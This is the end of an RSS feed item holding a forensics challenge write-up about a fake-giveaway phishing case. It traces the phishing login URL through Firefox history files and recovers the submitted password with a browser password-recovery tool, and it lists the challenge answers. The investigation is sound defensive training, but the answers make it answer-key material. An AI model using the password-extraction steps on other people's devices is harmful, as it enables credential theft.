ٍ&lt;img data-src=&#34;https://imgur.com/wNJKnce.png&#34; alt=&#34;&#34; title=&#34;Using HYBRID ANALYSIS&#34;&gt;&lt;/p&gt;
&lt;p&gt;Answer: 155.94.69.27&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;10- The fake giveaway used a login page to collect user information. Provide the full URL of the login page?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We find firefox installed in the victim device, Mozilla Firefox browsers stores his history and cookies in  &lt;code&gt;AppData\Roaming\Mozilla\Firefox\&lt;/code&gt; . We can inspect it using SQLite Browser.&lt;br&gt;
The most important db file is  &lt;code&gt;places.sqlite&lt;/code&gt; . Inspect it and open the  &lt;code&gt;moz_places&lt;/code&gt;  database table and check the history of the victim !&lt;br&gt;
&lt;img data-src=&#34;https://imgur.com/qbtAcRf.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Answer:  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2FwcEllLmNvbXBldGl0aW9ucy5jb20vbG9naW4ucGhw&#34;&gt;http://appIe.competitions.com/login.php&lt;/span&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;11- What is the password the user submitted to the login page?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There is a tool called  &lt;code&gt;Password Fox&lt;/code&gt;  that will resolve our problem here !&lt;br&gt;
PasswordFox is a small password recovery tool that allows you to view the user names and passwords stored by Mozilla Firefox Web browser.&lt;br&gt;
Download it from &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubmlyc29mdC5uZXQvdXRpbHMvcGFzc3dvcmRmb3guaHRtbA==&#34;&gt;here&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://imgur.com/pM1lfwD.png&#34; alt=&#34;&#34; title=&#34;Here is the password&#34;&gt;&lt;/p&gt;
&lt;p&gt;Answer: GacsriicUZMY4xiAF4yl&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
